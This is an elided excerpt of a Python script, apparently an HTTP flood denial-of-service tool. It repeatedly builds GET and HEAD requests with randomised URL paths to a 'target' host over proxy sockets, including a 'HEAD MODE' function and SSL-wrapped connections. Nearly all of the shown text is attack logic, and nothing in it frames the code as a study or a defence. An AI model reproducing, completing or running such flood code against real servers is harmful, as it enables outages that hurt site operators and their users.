		...
		try:
			...
			try:
				for n in range(multiple+1):
					get_host = "GET " + path + add + randomurl() + " HTTP/3\r\nHost: " + target + "\r\n"
...
def head(event,socks_type,ind_rlock):#HEAD MODE
	...
	while True:
		try:
			...
			try:
				for n in range(multiple+1):
					head_host = "HEAD " + path + add + randomurl() + " HTTP/3\r\nHost: " + target + "\r\n"
	...
	while True:
		...
		try:
			...
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			sent = s.send(str.encode("GET / HTTP/3\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
